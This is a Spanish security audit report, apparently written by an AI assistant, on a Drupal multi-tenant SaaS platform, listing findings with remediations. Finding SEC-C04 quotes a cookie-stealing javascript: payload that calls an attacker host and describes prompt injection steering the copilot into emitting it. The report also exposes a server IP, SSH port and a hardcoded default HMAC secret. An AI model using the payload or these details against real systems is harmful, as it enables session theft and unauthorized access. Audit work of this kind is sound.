# Auditoria Integral de Seguridad SaaS en Produccion — IONOS Dedicated

**Fecha de creacion:** 2026-03-26 10:00
**Ultima actualizacion:** 2026-03-26 10:00
**Autor:** IA Asistente (Claude Opus 4.6)
**Version:** 1.0.0
**Metodologia:** 9 Disciplinas Senior (Arquitectura SaaS, Ingenieria SW, UX, Drupal, Web Dev, Theming, GrapesJS, SEO/GEO, IA)
**Referencia previa:** [20260218-Auditoria_Integral_Seguridad_SaaS_v1_Claude.md](./20260218-Auditoria_Integral_Seguridad_SaaS_v1_Claude.md)
**Ambito:** Full-stack security audit (Infraestructura + Aplicacion + Safeguard System) del servidor IONOS Dedicated
**Documentos fuente:** 00_DIRECTRICES_PROYECTO.md v166.0.0, 00_FLUJO_TRABAJO_CLAUDE.md v115.0.0, CLAUDE.md v1.10.0

---

## Tabla de Contenidos

1. [Resumen Ejecutivo](#1-resumen-ejecutivo)
2. [Contexto y Alcance](#2-contexto-y-alcance)
3. [Hallazgos Criticos (5)](#3-hallazgos-criticos-5)
4. [Hallazgos Altos (10)](#4-hallazgos-altos-10)
5. [Hallazgos Medios (8)](#5-hallazgos-medios-8)
6. [Hallazgos Bajos (6)](#6-hallazgos-bajos-6)
7. [Areas Aprobadas (20+)](#7-areas-aprobadas-20)
8. [Matriz de Riesgo Consolidada](#8-matriz-de-riesgo-consolidada)
9. [Cobertura del Safeguard System](#9-cobertura-del-safeguard-system)
10. [Gaps de Validators Identificados](#10-gaps-de-validators-identificados)
11. [Plan de Remediacion Priorizado](#11-plan-de-remediacion-priorizado)
12. [Nuevas Reglas Propuestas](#12-nuevas-reglas-propuestas)
13. [Glosario de Terminos](#13-glosario-de-terminos)
14. [Registro de Cambios](#14-registro-de-cambios)

---

## 1. Resumen Ejecutivo

La plataforma **Jaraba Impact Platform** opera como SaaS multi-tenant sobre servidor IONOS Dedicated (AMD EPYC 12c/24t, 128GB DDR5, 2x1TB NVMe RAID1, Ubuntu 24.04) con stack Nginx + PHP-FPM 8.4 + MariaDB 10.11 + Redis 8.0 + Supervisor (4 AI workers). Esta auditoria evalua la postura de seguridad completa del sistema en produccion desde tres capas paralelas: infraestructura, aplicacion y safeguard system.

### Puntuacion Global: 7.2/10

La puntuacion refleja una base solida con multiples controles bien implementados (SECRET-MGMT-001 para OAuth/Stripe/SMTP, CSRF-LOGIN-FIX-001, SecurityHeadersSubscriber, PHPStan security.neon, tenant isolation validators), pero con 5 hallazgos criticos que requieren atencion inmediata — especialmente la falta de verificacion PII en input al LLM (riesgo RGPD) y la clave de Claude almacenada via Key module en base de datos.

### Distribucion de Hallazgos

| Severidad | Cantidad | Estado |
|-----------|----------|--------|
| **CRITICA** | 5 | Requieren fix inmediato |
| **ALTA** | 10 | Fix esta semana |
| **MEDIA** | 8 | Proximo sprint |
| **BAJA** | 6 | Backlog |
| **PASS** | 20+ | Verificadas correctas |

### Fortalezas Principales

| Fortaleza | Evidencia |
|-----------|-----------|
| Secret management OAuth/Stripe/SMTP | `settings.secrets.php` con `getenv()` exclusivo para 25+ secrets |
| CSRF triple capa | `patch-settings-csrf.php` + `settings.production.php` + Nginx `fastcgi_param` |
| Security headers completos | `SecurityHeadersSubscriber` con X-Frame-Options, HSTS, CSP, Vary:Host |
| PHPStan security bans | `eval()`, `exec()`, `shell_exec()`, `Connection::query()`, `md5()`, `sha1()` |
| Tenant isolation validators | 3 validators activos como `run_check` en CI |
| Redis ACL moderno | 14 checks en `validate-redis-config.php`, 3 usuarios ACL |
| Deploy safety | `DEPLOY-MAINTENANCE-SAFETY-001` con `if: always()` verificado |
| Dependency scanning | Composer audit + npm audit + Trivy en cada PR |

---

## 2. Contexto y Alcance

### 2.1 Servidor Auditado

| Aspecto | Detalle |
|---------|---------|
| **Proveedor** | IONOS Dedicated Server |
| **Hardware** | AMD EPYC 12c/24t, 128GB DDR5 ECC, 2x1TB NVMe RAID1 |
| **SO** | Ubuntu 24.04 LTS |
| **IP** | 82.223.204.169 |
| **SSH** | Puerto 2222 |
| **Stack** | Nginx + PHP-FPM 8.4 + MariaDB 10.11 + Redis 8.0 + Supervisor |
| **Dominios** | Multi-dominio con SSL Let's Encrypt via Certbot |

### 2.2 Alcance de la Auditoria

La auditoria cubre tres capas con agentes especializados ejecutados en paralelo:

1. **Capa Infraestructura:** Nginx, PHP-FPM, MariaDB, Redis, SSH, backups, deploy pipeline, Supervisor workers, logrotate
2. **Capa Aplicacion:** Drupal 11, secrets management, CSRF, XSS (Twig + JS), SQL injection, access control, tenant isolation, Stripe/pagos, AI security, session management, CSP
3. **Capa Safeguard System:** 151 validators, pre-commit hooks, CI security gates, runtime checks, gaps de cobertura

### 2.3 Metodologia

- **Tipo:** Revision estatica de codigo (NO se ejecutaron comandos en produccion)
- **Archivos auditados:** 150+ archivos de configuracion, servicios PHP, templates Twig, JS, workflows CI/CD
- **Herramientas:** Analisis manual con referencia cruzada a 160+ reglas del proyecto documentadas en CLAUDE.md
- **Agentes:** 3 agentes de seguridad especializados ejecutados en paralelo (infraestructura, aplicacion, safeguard)

---

## 3. Hallazgos Criticos (5)

### SEC-C01: Claude API key en Key module con `key_provider: config` (NO env)

| Aspecto | Detalle |
|---------|---------|
| **Severidad** | CRITICA |
| **Reglas violadas** | SECRET-MGMT-001, KEY-DEPRECATED-001 |
| **Archivos** | `config/sync/key.key.claude_api_key.yml`, `jaraba_copilot_v2/src/Service/ClaudeApiService.php:477-490` |
| **CWE** | CWE-312 (Cleartext Storage of Sensitive Information) |
| **OWASP** | A02:2021 — Cryptographic Failures |

**Descripcion detallada:**

La key entity `claude_api_key` esta configurada con `key_provider: config` y `key_provider_settings: {}` (vacio). Esto significa que el valor real de la API key de Claude/Anthropic se almacena en la base de datos de Drupal a traves del formulario de configuracion (`CopilotSettingsForm`), NO a traves de variables de entorno. El servicio `ClaudeApiService::getApiKey()` resuelve la clave via `$this->keyRepository->getKey($keyId)->getKeyValue()`.

Contrasta directamente con la key de Google Gemini (`key.key.google_gemini_api_key.yml`) que correctamente usa `key_provider: env` con `env_variable: GOOGLE_GEMINI_API_KEY`. Adicionalmente, `settings.secrets.php` no contiene ninguna entrada para `CLAUDE_API_KEY` ni `ANTHROPIC_API_KEY`.

La regla CLAUDE.md establece explicitamente: "NUNCA usar Key module" (KEY-DEPRECATED-001) y "NUNCA secrets en config/sync" (SECRET-MGMT-001).

**Impacto:**

La API key de Claude podria exponerse en: (1) `drush config:export` si se ejecuta sin cuidado, (2) backups de base de datos sin cifrar (hallazgo SEC-M04), (3) SQL dump exfiltrado por vulnerabilidad de lectura de archivos, (4) cualquier acceso directo a la base de datos. El coste directo son llamadas fraudulentas a Claude API y potencial exposicion de datos de prompt/response almacenados.

**Remediacion:**

```php
// En settings.secrets.php — anadir:
if ($claude_key = getenv('CLAUDE_API_KEY')) {
  $config['jaraba_copilot_v2.settings']['claude_api_key_value'] = $claude_key;
}
```

Modificar `ClaudeApiService::getApiKey()` para leer directamente desde config override. Actualizar `key.key.claude_api_key.yml` con `key_provider: env` y `env_variable: CLAUDE_API_KEY`. Eliminar la dependencia de `KeyRepositoryInterface` en `ClaudeApiService` y `CopilotSettingsForm`.

---

### SEC-C02: HMAC secret de adjuntos hardcodeado con valor por defecto inseguro

| Aspecto | Detalle |
|---------|---------|
| **Severidad** | CRITICA |
| **Reglas violadas** | SECRET-MGMT-001, AUDIT-SEC-001 |
| **Archivo** | `jaraba_support/src/Service/AttachmentUrlService.php:230` |
| **CWE** | CWE-798 (Use of Hard-coded Credentials) |
| **OWASP** | A02:2021 — Cryptographic Failures |

**Descripcion detallada:**

El secret usado para firmar URLs de descarga de adjuntos de tickets de soporte tiene un fallback hardcodeado:

```php
->get('attachment_hmac_secret') ?? 'jaraba_support_default_key';
```

Si la clave HMAC no esta configurada en la base de datos (estado por defecto en instalaciones nuevas o si el config se pierde), TODOS los adjuntos protegidos por HMAC son accesibles para cualquier persona que conozca esta clave publica — visible en el repositorio GitHub (aunque privado, cualquier colaborador la conoce). `settings.secrets.php` no incluye ningun override para `attachment_hmac_secret`.

**Impacto:**

Exfiltracion potencial de adjuntos de soporte de cualquier tenant. Los archivos adjuntos en tickets de soporte pueden contener informacion altamente sensible: contratos, DNIs, documentos financieros, capturas de pantalla con datos personales. Cualquier atacante con acceso al repositorio puede generar URLs HMAC validas para descargar cualquier adjunto.

**Remediacion:**

```php
// En settings.secrets.php:
if ($attachment_secret = getenv('SUPPORT_ATTACHMENT_HMAC_SECRET')) {
  $config['jaraba_support.settings']['attachment_hmac_secret'] = $attachment_secret;
}
```

Cambiar el fallback a lanzar una excepcion en produccion si no esta configurado. Generar un secret aleatorio de 256 bits para produccion y almacenarlo como variable de entorno en el servidor IONOS.

---

### SEC-C03: PII no verificado en INPUT al LLM (AI-GUARDRAILS-PII-001)

| Aspecto | Detalle |
|---------|---------|
| **Severidad** | CRITICA |
| **Reglas violadas** | AI-GUARDRAILS-PII-001, RGPD Art. 44-46 |
| **Archivos** | `jaraba_copilot_v2/src/Service/CopilotOrchestratorService.php:220-280`, `jaraba_ai_agents/src/Agent/SmartBaseAgent.php` |
| **CWE** | CWE-359 (Exposure of Private Personal Information) |
| **OWASP** | A02:2021 — Cryptographic Failures |

**Descripcion detallada:**

El metodo `chat()` de `CopilotOrchestratorService` pasa directamente el mensaje del usuario al LLM (`callProvider()`) sin invocar `AIGuardrailsService::checkPII()` en el input. El guardrail de PII SOLO se aplica en el **output** (linea 1585-1589: `maskOutputPII`). No hay ninguna llamada a `checkPII()` en el flujo principal `chat() -> enrichWithNormativeKnowledge() -> callProvider()`.

El modulo `MultiModalBridgeService` si llama a `checkPII()` (linea 333), pero solo en el path de prompts de imagen/audio, no en el path principal de texto. La ruta publica `jaraba_copilot_v2.api.public_chat` es accesible sin autenticacion y podria enviar datos PII al LLM externo sin ninguna deteccion.

De forma analoga, `SmartBaseAgent` (clase base de los 11 agentes Gen 2) aplica `maskOutputPII()` en la salida pero no verifica PII en la entrada antes de `callAiApiWithTools()`.

**Impacto:**

Datos PII de usuarios espanoles (DNI, NIE, IBAN ES, NIF/CIF, telefonos +34) se envian directamente a APIs externas de terceros (Anthropic en EE.UU., Google en EE.UU.) sin deteccion ni bloqueo. Esto constituye una transferencia internacional de datos personales sin garantias adecuadas, incumpliendo el RGPD Art. 44-46. Riesgo de multa AEPD de hasta el 4% de la facturacion anual global.

**Remediacion:**

Anadir verificacion PII bidireccional en `CopilotOrchestratorService::chat()` antes de `callProvider()`:

```php
if ($this->guardrailsService && method_exists($this->guardrailsService, 'checkPII')) {
  $piiResult = $this->guardrailsService->checkPII($message);
  if (!empty($piiResult['blocked'])) {
    return [
      'text' => $this->t('Por seguridad, no puedo procesar mensajes con datos personales identificativos (DNI, NIE, IBAN, etc.). Por favor, reformula tu consulta sin incluir estos datos.'),
      'pii_blocked' => TRUE,
    ];
  }
  $message = $piiResult['masked'] ?? $message;
}
```

Aplicar el mismo patron en `SmartBaseAgent::execute()` antes de `callAiApiWithTools()`. Crear validator `validate-ai-pii-guardrails.php` para garantizar cobertura automatica.

---

### SEC-C04: XSS via `javascript:` en parseMarkdown del Copilot

| Aspecto | Detalle |
|---------|---------|
| **Severidad** | CRITICA |
| **Reglas violadas** | INNERHTML-XSS-001, AUDIT-SEC-003 |
| **Archivo** | `ecosistema_jaraba_core/js/contextual-copilot.js:83-115` |
| **CWE** | CWE-79 (Cross-Site Scripting) |
| **OWASP** | A03:2021 — Injection |

**Descripcion detallada:**

La funcion `parseMarkdown()` del copilot contextual procesa respuestas del LLM y las inyecta via `bubble.innerHTML = parseMarkdown(text)` (linea 504). Los enlaces Markdown `[texto](url)` y los ACTION links insertan la URL directamente en el atributo `href` sin validacion de protocolo:

```javascript
// Linea 112 — links Markdown:
linkPlaceholders.push('<a href="' + url + '" ...>' + safeText + '</a>');
// Linea 83-86 — ACTION links:
var safeUrl = escapeHtml(url.trim());
actionPlaceholders.push('<a ... href="' + safeUrl + '">' + safeLabel + '</a>');
```

`escapeHtml()` convierte entidades HTML (`<`, `>`, `&`, `"`, `'`) pero NO bloquea el protocolo `javascript:`. Una respuesta LLM comprometida (via prompt injection por otro usuario o por contenido malicioso en el grounding) podria incluir `[click aqui](javascript:fetch('https://attacker.com/?c='+document.cookie))` y ejecutar codigo arbitrario en el navegador de la victima.

**Impacto:**

XSS via prompt injection del LLM. Un atacante puede: (1) robar la sesion Drupal de cualquier usuario, (2) extraer tokens CSRF, (3) ejecutar acciones en nombre del usuario (cambiar plan, modificar datos del tenant), (4) inyectar keyloggers persistentes. Afecta a todos los usuarios del copilot contextual.

**Remediacion:**

```javascript
function isSafeUrl(url) {
  try {
    var parsed = new URL(url, window.location.href);
    return ['http:', 'https:', ''].indexOf(parsed.protocol) !== -1;
  } catch(e) { return false; }
}

// Antes de cada push de link:
if (!isSafeUrl(url)) return match; // no crear enlace, devolver texto plano
```

Aplicar la misma validacion para ACTION links y cualquier otro punto de insercion de URLs desde respuestas del LLM.

---

### SEC-C05: XSS en SuccessCase `text_long` con `|raw` sin sanitizar

| Aspecto | Detalle |
|---------|---------|
| **Severidad** | CRITICA |
| **Reglas violadas** | AUDIT-SEC-003 |
| **Archivos** | `jaraba_success_cases/src/Controller/CaseStudyLandingController.php:241-243`, `jaraba_success_cases/templates/success-case-detail.html.twig:139,156,173` |
| **CWE** | CWE-79 (Cross-Site Scripting) |
| **OWASP** | A03:2021 — Injection |

**Descripcion detallada:**

Los campos `challenge_before`, `solution_during` y `result_after` de la entidad SuccessCase son `BaseFieldDefinition::create('text_long')` editables por usuarios con permisos de edicion. En el controller se pasan directamente como `.value` crudo:

```php
// CaseStudyLandingController.php:241 — sin check_markup():
'challenge_before' => $case->get('challenge_before')->value ?? '',
```

Y en el template se renderizan con `|raw`:

```twig
{# success-case-detail.html.twig:139 #}
<div class="sc-journey__body">{{ case.challenge_before|raw }}</div>
```

No hay llamada a `check_markup()`, `Xss::filterAdmin()` ni `Markup::create()` en la cadena. Contrasta con el patron correcto de `StaticPageController` que si usa `sanitizeContent()` con `Xss::filterAdmin()`.

**Impacto:**

Stored XSS. Un usuario con permisos de edicion de SuccessCase (administrador de tenant o moderador de contenido) puede inyectar JavaScript arbitrario que se ejecuta para TODOS los visitantes de la pagina de caso de exito, incluyendo otros administradores. En un modelo SaaS multi-tenant, esto permite escalada de privilegios cross-tenant.

**Remediacion:**

```php
use Drupal\Component\Utility\Xss;

'challenge_before' => Xss::filterAdmin($case->get('challenge_before')->value ?? ''),
'solution_during' => Xss::filterAdmin($case->get('solution_during')->value ?? ''),
'result_after' => Xss::filterAdmin($case->get('result_after')->value ?? ''),
```

Alternativa mas robusta: usar `check_markup($value, $format ?? 'basic_html')` para respetar el formato de texto configurado.

---

## 4. Hallazgos Altos (10)

### SEC-A01: SSH `known_hosts` dinamico sin verificacion de fingerprint

| Aspecto | Detalle |
|---------|---------|
| **Severidad** | ALTA |
| **Archivos** | `.github/workflows/deploy.yml:119-120`, `daily-backup.yml:58-59`, `verify-backups.yml:46-47` |
| **CWE** | CWE-295 (Improper Certificate Validation) |

Los tres workflows que conectan al servidor de produccion ejecutan `ssh-keyscan -p ${{ env.DEPLOY_PORT }} -H ${{ secrets.DEPLOY_HOST }} >> ~/.ssh/known_hosts` en cada ejecucion. Esto acepta incondicionalmente la clave del servidor en cada conexion, convirtiendo TOFU (Trust On First Use) en "Trust On Every Use". Si el DNS del host es manipulado, un atacante podria recibir las 25+ claves API de produccion que el workflow inyecta via SCP.

**Remediacion:** Guardar el fingerprint conocido en un GitHub Secret `DEPLOY_HOST_KNOWN_HOSTS` y referenciarlo directamente en lugar de ejecutar `ssh-keyscan` en cada run.

---

### SEC-A02: Nginx sin `server_tokens off`, TLS hardening ni rate limiting

| Aspecto | Detalle |
|---------|---------|
| **Severidad** | ALTA |
| **Archivos** | `config/deploy/nginx-metasites.conf`, `config/deploy/nginx-jaraba-common.conf` |
| **OWASP** | A05:2021 — Security Misconfiguration |

La configuracion Nginx del repositorio (que se despliega automaticamente a produccion) carece de: (1) `server_tokens off` — el servidor anuncia su version en respuestas de error, (2) `ssl_protocols` y `ssl_ciphers` explicitos — se delega completamente a Certbot, (3) `limit_req_zone` / `limit_req` — no hay rate limiting a nivel Nginx para `/user/login`, `/api/`, webhooks Stripe. El `RateLimiterService` existe en PHP pero es segunda linea de defensa.

**Remediacion:** Anadir `server_tokens off`, `ssl_protocols TLSv1.2 TLSv1.3`, `ssl_prefer_server_ciphers off`, y `limit_req_zone` para login (5r/m) y API (60r/m) en `nginx-jaraba-common.conf`.

---

### SEC-A03: `display_errors = On` en php.ini del repositorio

| Aspecto | Detalle |
|---------|---------|
| **Severidad** | ALTA |
| **Archivo** | `php.ini:17` |
| **CWE** | CWE-209 (Information Exposure Through Error Message) |

El archivo `php.ini` en la raiz del proyecto tiene `display_errors = On` y `error_reporting = E_ALL`. Aunque el archivo es para Lando (dev local), su presencia en el repositorio crea ambiguedad. Si fuera procesado en produccion, expondria stack traces con rutas, versiones y logica interna. `web/.user.ini` tampoco establece explicitamente `display_errors = Off`.

**Remediacion:** Crear `config/deploy/php/20-security-prod.ini` con `expose_php = Off`, `display_errors = Off`, `log_errors = On`, session hardening (`cookie_secure`, `cookie_httponly`, `use_strict_mode`). Incluir su deploy en el step de sync de configuracion PHP.

---

### SEC-A04: CSP con `unsafe-inline`, `unsafe-eval` y CDNs publicas

| Aspecto | Detalle |
|---------|---------|
| **Severidad** | ALTA |
| **Archivo** | `ecosistema_jaraba_core/src/EventSubscriber/SecurityHeadersSubscriber.php:129` |
| **OWASP** | A05:2021 — Security Misconfiguration |

El CSP incluye `'unsafe-inline'`, `'unsafe-eval'`, `cdn.jsdelivr.net` y `unpkg.com` en `script-src`. Esto anula practicamente toda proteccion CSP contra XSS. `unsafe-eval` se justifica parcialmente por GrapesJS, pero `cdn.jsdelivr.net` y `unpkg.com` son CDNs publicas donde cualquier paquete puede publicarse (supply chain attack vector).

**Remediacion a medio plazo:** (1) Separar CSP del editor GrapesJS (solo rutas `/admin/`) del CSP del frontend publico, (2) sustituir CDNs publicas por vendor JS local, (3) migrar a CSP nonces con `\Drupal::service('csp.nonce')`.

---

### SEC-A05: XSS en `content|raw` de InfoPagesController sin sanitizar

| Aspecto | Detalle |
|---------|---------|
| **Severidad** | ALTA |
| **Archivos** | `ecosistema_jaraba_core/src/Controller/InfoPagesController.php:27-30`, `info-page-about.html.twig:24` |
| **Regla** | AUDIT-SEC-003 |

`InfoPagesController::about()` pasa `content` desde `theme_get_setting()` sin sanitizar. El controller hermano `StaticPageController` si aplica `Xss::filterAdmin()`. El template usa `{{ content|raw }}`. Si un administrador con acceso al panel de tema inyecta JS, se ejecuta para todos los visitantes.

**Remediacion:** Aplicar `Xss::filterAdmin($content)` en el controller antes de pasarlo al template, identico al patron de `StaticPageController`.

---

### SEC-A06: XSS en `map_embed|raw` sin `striptags` en jarabalex

| Aspecto | Detalle |
|---------|---------|
| **Severidad** | ALTA |
| **Archivo** | `jaraba_page_builder/templates/blocks/verticals/jarabalex/map.html.twig:22` |
| **Regla** | AUDIT-SEC-003 |

El template de mapa de JarabaLex usa `{{ map_embed|raw }}` sin `|striptags('<iframe>')` previo, a diferencia de los otros 6 bloques de mapa del mismo modulo que si aplican el filtro. Inconsistencia en el patron de sanitizacion.

**Remediacion:** Cambiar a `{{ map_embed|striptags('<iframe>')|raw }}` para mantener consistencia con el resto de bloques de mapa.

---

### SEC-A07: Tenant ID type mismatch `string === int` siempre FALSE

| Aspecto | Detalle |
|---------|---------|
| **Severidad** | ALTA |
| **Archivo** | `jaraba_interactive/src/InteractiveContentAccessControlHandler.php:96-103` |
| **Reglas** | ACCESS-STRICT-001, TENANT-ISOLATION-ACCESS-001 |

La comparacion `$membership->getGroup()->id() === $tenantId` compara `string` (retorno de `EntityInterface::id()` en MariaDB) con `int` (param tipado). Con `strict_types=1`, `"42" === 42` es siempre FALSE. Esto puede hacer que NINGUN usuario pertenezca a NINGUN tenant, y si el access handler retorna `neutral` ante el fallo, podria permitir acceso cross-tenant a contenido interactivo.

**Remediacion:** `(int) $membership->getGroup()->id() === (int) $tenantId` — identico al patron correcto ya usado en `RagTenantFilterService.php:285`.

---

### SEC-A08: `google/protobuf` v4.33.5 con vulnerabilidad DoS activa

| Aspecto | Detalle |
|---------|---------|
| **Severidad** | ALTA |
| **Referencia** | GHSA-p2gh-cfq4-4wjc |
| **CWE** | CWE-400 (Uncontrolled Resource Consumption) |

`google/protobuf v4.33.5` es vulnerable a DoS via mensajes con varints negativos o recursion profunda. Afecta versiones `< 4.33.6`. Reportado 2026-03-25. La libreria se usa a traves de dependencias del AI stack (gRPC/Gemini). En un SaaS multi-tenant, un DoS afecta a todos los tenants.

**Remediacion:** `composer update google/protobuf --with-dependencies` (verificar que `>= 4.33.6` esta disponible).

---

### SEC-A09: `validate-api-contract` (CSRF) es `warn_check` — no bloquea CI

| Aspecto | Detalle |
|---------|---------|
| **Severidad** | ALTA |
| **Archivo** | `scripts/validation/validate-all.sh:635` |
| **Regla** | CSRF-API-001 |

El validator que verifica que rutas POST/PATCH/DELETE tienen `_csrf_request_header_token: 'TRUE'` esta registrado como `warn_check`, no como `run_check`. Nunca bloquea el pipeline CI. No esta incluido en lint-staged, por lo que rutas nuevas sin CSRF pueden llegar a produccion sin alerta.

**Remediacion:** Cambiar `warn_check` por `run_check` en `validate-all.sh`. Anadir `validate-api-contract.php` a lint-staged para archivos `*.routing.yml`.

---

### SEC-A10: Ausencia total de validator para `|raw` en Twig (35+ usos)

| Aspecto | Detalle |
|---------|---------|
| **Severidad** | ALTA |
| **Regla** | AUDIT-SEC-003 |

Existen al menos 35 usos de `|raw` en templates Twig de modulos y tema custom. Aunque varios son seguros (JSON-LD con `|json_encode|raw`, SVG hardcodeados), no existe ningun validator automatico que verifique que cada variable pasada con `|raw` ha sido sanitizada previamente. La cadena de sanitizacion depende exclusivamente de revision manual en PRs.

**Remediacion:** Crear `scripts/validation/validate-twig-raw-audit.php` que: (1) liste todos los `|raw` en templates, (2) verifique que en el controller/preprocess asociado existe una llamada a `check_markup()`, `Xss::filter*()` o `Markup::create()` para cada variable, (3) mantenga un allowlist auditada para usos seguros conocidos (JSON-LD, SVG inline). Anadir a `warn_check` minimo.

---

## 5. Hallazgos Medios (8)

### SEC-M01: PHP produccion sin archivo de seguridad dedicado

| Aspecto | Detalle |
|---------|---------|
| **Severidad** | MEDIA |
| **Archivos** | `config/deploy/php/10-opcache-prod.ini`, `web/.user.ini` |
| **OWASP** | A05:2021 |

El unico archivo PHP de produccion en el repositorio es `10-opcache-prod.ini` (solo OPcache). No existe un archivo de seguridad PHP para produccion que establezca: `expose_php = Off`, `session.cookie_httponly = 1`, `session.cookie_secure = 1`, `session.use_strict_mode = 1`, `disable_functions` para funciones peligrosas.

**Remediacion:** Crear `config/deploy/php/20-security-prod.ini` con hardening de PHP y sesiones. Incluir en el pipeline de deploy.

---

### SEC-M02: SUPERVISOR-SLEEP-001 incumplida en 4 de 5 workers AI

| Aspecto | Detalle |
|---------|---------|
| **Severidad** | MEDIA |
| **Archivo** | `config/deploy/supervisor-ai-workers.conf:17-88` |
| **Regla** | SUPERVISOR-SLEEP-001 |

Los workers `jaraba-ai-a2a`, `jaraba-ai-insights`, `jaraba-ai-quality` y `jaraba-ai-scheduled` ejecutan `drush queue:run` directamente sin sleep. Cuando la cola esta vacia, `drush queue:run` retorna inmediatamente y Supervisor reinicia el proceso de inmediato. El script wrapper `/opt/jaraba/scripts/queue-worker.sh` referenciado en CLAUDE.md no existe en el repositorio.

**Impacto:** Con colas vacias, hasta 6 bootstraps Drupal por segundo consumen CPU 350%+ y saturan conexiones MariaDB/Redis.

**Remediacion:** Anadir `; sleep 30` al final de cada `command=` en la configuracion de Supervisor, o crear el script wrapper referenciado.

---

### SEC-M03: MariaDB sin `bind-address = 127.0.0.1` ni `local-infile = 0`

| Aspecto | Detalle |
|---------|---------|
| **Severidad** | MEDIA |
| **Archivo** | `config/deploy/mariadb/my.cnf` |
| **CWE** | CWE-16 (Configuration) |

Sin `bind-address = 127.0.0.1`, MariaDB escucha en todas las interfaces. Si el firewall IONOS tuviera una misconfiguration, el puerto 3306 seria accesible desde Internet. Sin `local-infile = 0`, ataques LOAD DATA LOCAL INFILE son posibles. `expire_logs_days = 3` es agresivo para recuperacion ante incidentes.

**Remediacion:** Anadir `bind-address = 127.0.0.1`, `local-infile = 0`, `event_scheduler = OFF`, y aumentar `expire_logs_days = 7`.

---

### SEC-M04: Backups sin cifrado + BACKUP-3LAYER-001 incompleto

| Aspecto | Detalle |
|---------|---------|
| **Severidad** | MEDIA |
| **Archivo** | `.github/workflows/daily-backup.yml:81-103` |
| **Regla** | BACKUP-3LAYER-001 |

Dos problemas compuestos: (1) El fallback mysqldump parsea credenciales de `settings.local.php` via `grep` y las pasa a la linea de comandos (visibles en `ps aux`), (2) Los backups `.sql.gz` se almacenan sin cifrado. Las capas 2 (Hetzner S3) y 3 (NAS GoodSync) de BACKUP-3LAYER-001 no estan implementadas en ningun workflow ni script del repositorio.

**Remediacion:** (1) Reemplazar fallback mysqldump con `drush sql-dump`, (2) cifrar backups con GPG antes de almacenar, (3) implementar sync a Hetzner S3 via `rclone` y verificacion periodica.

---

### SEC-M05: Redis `bind 0.0.0.0` en HA config + `users.acl` no en repo

| Aspecto | Detalle |
|---------|---------|
| **Severidad** | MEDIA |
| **Archivo** | `infrastructure/ha/redis/redis.conf:12` |
| **Regla** | REDIS-ACL-001 |

Redis escucha en `0.0.0.0` (todas las interfaces). Con `protected-mode yes` es mas seguro, pero sigue siendo mas permisivo que necesario si Redis y PHP-FPM estan en el mismo host. El archivo `users.acl` referenciado no existe en el repositorio, impidiendo su auditoria.

**Remediacion:** Cambiar a `bind 127.0.0.1`. Anadir `users.acl` de referencia (con passwords placeholder) al repositorio.

---

### SEC-M06: Trivy suprime `generic-api-key` globalmente

| Aspecto | Detalle |
|---------|---------|
| **Severidad** | MEDIA |
| **Archivo** | `trivy.yaml` |
| **Regla** | SECRET-MGMT-001 |

`trivy.yaml` suprime la deteccion `generic-api-key` globalmente, lo que impide detectar leaks de API keys de cualquier tipo en todo el codigo. La supresion es excesivamente amplia.

**Remediacion:** Reemplazar por supresiones especificas por path para falsos positivos concretos.

---

### SEC-M07: `validate-route-permissions` excluido del modo `--fast`

| Aspecto | Detalle |
|---------|---------|
| **Severidad** | MEDIA |
| **Archivo** | `scripts/validation/validate-all.sh` |
| **Regla** | AUDIT-SEC-002 |

El validator de permisos de rutas se marca como `skip_check` en modo `--fast` (que es el que ejecuta lint-staged en pre-commit para `*.routing.yml`). Rutas nuevas sin `_permission` pueden crearse sin alerta inmediata.

**Remediacion:** Incluir `validate-route-permissions.php` en lint-staged directo o en el bloque `--fast`.

---

### SEC-M08: `validate-access-handler-impl` es `warn_check` en CI

| Aspecto | Detalle |
|---------|---------|
| **Severidad** | MEDIA |
| **Archivo** | `scripts/validation/validate-all.sh:632` |
| **Regla** | TENANT-ISOLATION-ACCESS-001 |

El validator que verifica la implementacion real de `checkAccess()` en AccessControlHandlers esta como `warn_check` (no bloquea CI), mientras que `TENANT-CHECK-001` (que verifica la presencia del handler) si es `run_check`. AccessControlHandlers nuevos sin verificacion de tenant pueden mergearse sin fallo.

**Remediacion:** Cambiar a `run_check`.

---

## 6. Hallazgos Bajos (6)

### SEC-B01: HSTS opt-in con default FALSE

| Aspecto | Detalle |
|---------|---------|
| **Archivo** | `SecurityHeadersSubscriber.php:166-169` |

HSTS se inyecta solo si `$config->get('hsts.enabled') ?? FALSE`. En un entorno fresh sin config importada, HSTS estara desactivado. Mitigado parcialmente porque Nginx redirige HTTP a HTTPS.

**Remediacion:** Cambiar default a `TRUE` o anadir en `config/install/` del modulo.

---

### SEC-B02: Logrotate 14 dias insuficiente para forensics

| Aspecto | Detalle |
|---------|---------|
| **Archivo** | `scripts/setup-ionos-dedicated.sh:429-443` |

14 dias de retencion de logs + 3 rotaciones de 10MB en Supervisor workers. Si un incidente se detecta tarde (> 14 dias), los logs forenses no estaran disponibles.

**Remediacion:** Aumentar a `rotate 30` y `stderr_logfile_backups=7`.

---

### SEC-B03: Deploy sin verificacion SHA del commit

| Aspecto | Detalle |
|---------|---------|
| **Archivo** | `.github/workflows/deploy.yml:210` |

`git reset --hard origin/main` sin verificar que el SHA desplegado coincide con el SHA del trigger del workflow.

**Remediacion:** Anadir verificacion `CURRENT_SHA == EXPECTED_SHA` post-pull.

---

### SEC-B04: Lead magnet POST sin rate limiting ni honeypot verificado

| Aspecto | Detalle |
|---------|---------|
| **Archivos** | Rutas `lead_magnet.*_submit` con `_access: 'TRUE'` |

Rutas POST completamente publicas. Sin rate limiter, honeypot ni recaptcha verificado. Abusos automatizados contaminarian el CRM y dispararian pipelines de AI.

**Remediacion:** Anadir rate limiting (5r/m por IP) y honeypot field en el formulario.

---

### SEC-B05: CSRF token: 5 fetch separados en jaraba_support JS

| Aspecto | Detalle |
|---------|---------|
| **Archivos** | 5 archivos JS en `jaraba_support/js/` |

Cada archivo JS tiene su propio `csrfTokenPromise = null`, lo que genera 5 requests al endpoint `/session/token` al cargar paginas con todos los behaviors. No es vulnerabilidad directa pero viola CSRF-JS-CACHE-001 y aumenta superficie de ataque.

**Remediacion:** Centralizar token fetch en un unico modulo compartido.

---

### SEC-B06: OWASP ZAP solo en schedule, no en cada PR

| Aspecto | Detalle |
|---------|---------|
| **Archivo** | `.github/workflows/security-scan.yml` |

ZAP baseline scan esta condicionado a no ejecutarse en `push`. Headers HTTP y vulnerabilidades DAST solo se validan una vez al dia, no en cada PR.

